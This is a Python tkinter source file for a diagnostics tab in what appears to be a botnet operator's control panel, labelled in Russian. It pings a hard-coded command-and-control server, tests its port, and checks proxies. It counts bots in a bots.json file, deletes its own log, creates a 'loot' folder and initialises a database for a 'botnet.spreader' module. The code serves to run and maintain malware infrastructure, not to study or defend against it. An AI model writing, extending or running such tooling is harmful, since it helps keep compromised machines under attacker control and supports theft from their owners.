import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import subprocess, os, json, sys, socket, importlib, pkg_resources

class DiagnosticTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.build_ui()

    def build_ui(self):
        self.output = scrolledtext.ScrolledText(self, width=80, height=20, state=tk.NORMAL)
        self.output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        btn_frame = ttk.Frame(self)
        btn_frame.pack(fill=tk.X, pady=5)

        buttons = [
            ("Проверить VPS", self.check_vps),
            ("Проверить прокси", self.check_proxy),
            ("Проверить C2", self.check_c2),
            ("Проверить зависимости", self.check_dependencies),
            ("Установить зависимости", self.install_dependencies),
            ("Очистить логи", self.clear_logs),
            ("Проверить ботов", self.check_bots),
            ("Автоисправление", self.auto_fix),
            ("Пинг интернета", self.ping_internet),
            ("Информация о системе", self.system_info),
        ]
        for text, cmd in buttons:
            ttk.Button(btn_frame, text=text, command=cmd).pack(side=tk.LEFT, padx=2)

    def log(self, message):
        self.output.insert(tk.END, message + "\n")
        self.output.see(tk.END)

    def check_vps(self):
        self.log("=== Проверка VPS (ping) ===")
        try:
            with open("avz_settings.json","r") as f:
                host = json.load(f).get("c2_host", "80.249.146.202")
        except:
            host = "80.249.146.202"
        res = subprocess.run(["ping", "-n", "2", host], capture_output=True, text=True, timeout=5)
        self.log(res.stdout)

    def check_proxy(self):
        self.log("=== Проверка прокси ===")
        try:
            from engine.proxy import ProxyManager
            pm = ProxyManager()
            self.log(f"Загружено прокси: {len(pm.proxies)}")
            if pm.proxies:
                test_proxy = pm.proxies[0].get('url')
                self.log(f"Тестовый прокси: {test_proxy}")
        except Exception as e:
            self.log(f"Ошибка проверки прокси: {e}")

    def check_c2(self):
        self.log("=== Проверка C2 ===")
        try:
            with open("avz_settings.json","r") as f:
                s = json.load(f)
            host = s.get("c2_host", "80.249.146.202")
            port = s.get("c2_port", 8888)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((host, port))
            if result == 0:
                self.log(f"C2 {host}:{port} доступен")
            else:
                self.log(f"C2 {host}:{port} НЕ доступен")
            sock.close()
        except Exception as e:
            self.log(f"Ошибка проверки C2: {e}")

    def check_dependencies(self):
        self.log("=== Проверка зависимостей ===")
        if os.path.exists("requirements.txt"):
            with open("requirements.txt") as f:
                packages = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            missing = []
            for pkg in packages:
                try:
                    pkg_resources.require(pkg)
                except (pkg_resources.DistributionNotFound, pkg_resources.VersionConflict):
                    missing.append(pkg)
            if missing:
                self.log(f"Отсутствуют: {', '.join(missing)}")
            else:
                self.log("Все зависимости установлены")
        else:
            self.log("requirements.txt не найден")

    def install_dependencies(self):
        self.log("=== Установка зависимостей ===")
        try:
            from update import install_missing_dependencies
            install_missing_dependencies()
            self.log("Готово")
        except Exception as e:
            self.log(f"Ошибка: {e}")

    def clear_logs(self):
        try:
            if os.path.exists("avz.log"):
                os.remove("avz.log")
                self.log("Лог avz.log удалён")
            else:
                self.log("Лог avz.log не найден")
        except Exception as e:
            self.log(f"Ошибка очистки: {e}")

    def check_bots(self):
        self.log("=== Проверка ботов ===")
        try:
            if os.path.exists("bots.json"):
                with open("bots.json") as f:
                    data = json.load(f)
                self.log(f"Ботов в базе: {len(data)}")
            else:
                self.log("Файл bots.json не найден")
        except Exception as e:
            self.log(f"Ошибка: {e}")

    def auto_fix(self):
        self.log("=== Автоисправление ===")
        # Переустановка зависимостей
        self.install_dependencies()
        # Проверка и создание папки loot
        if not os.path.exists("loot"):
            os.makedirs("loot")
            self.log("Создана папка loot")
        # Инициализация базы обучения спредера
        try:
            from botnet.spreader import init_db
            import asyncio
            asyncio.run(init_db())
            self.log("База обучения спредера инициализирована")
        except Exception as e:
            self.log(f"Ошибка инициализации БД: {e}")
        self.log("Автоисправление завершено")

    def ping_internet(self):
        self.log("=== Пинг интернета ===")
        res = subprocess.run(["ping", "-n", "2", "8.8.8.8"], capture_output=True, text=True)
        self.log(res.stdout)

    def system_info(self):
        self.log("=== Информация о системе ===")
        try:
            import platform
            self.log(f"ОС: {platform.system()} {platform.release()}")
            self.log(f"Python: {sys.version}")
            self.log(f"Текущая директория: {os.getcwd()}")
        except Exception as e:
            self.log(f"Ошибка: {e}")
